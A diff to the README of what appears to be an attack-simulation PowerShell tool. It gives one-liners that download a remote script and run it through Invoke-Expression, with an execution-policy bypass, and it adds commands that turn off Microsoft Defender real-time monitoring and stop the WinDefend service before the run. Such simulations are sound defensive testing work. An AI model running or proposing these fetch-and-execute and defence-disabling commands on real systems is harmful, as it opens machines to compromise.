@@ -12,6 +12,18 @@ The following command is all you need.  Run it on any windows system and it will
 > `[System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript.ps1")`
 
 
+While the script will attempt to disable MS Defender in the evasion step, you may need to proactively disable your endpoint protection prior to running this initial command to let it through:
+
+> `powershell.exe -command 'Set-MpPreference -DisableRealtimeMonitoring $true'`
+> 
+> `sc stop WinDefend`
+
+Restore Defender:
+> `sc start WinDefend`
+> 
+> `powershell.exe -command 'Set-MpPreference -DisableRealtimeMonitoring $false'`
+
+
 ### Example 2 (For use in batch or from cmd.exe):
 If running from outside Powershell (like in cmd.exe or a batch script):
 > `powershell.exe -ExecutionPolicy bypass -noprofile -nologo -command { [System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript.ps1") }`
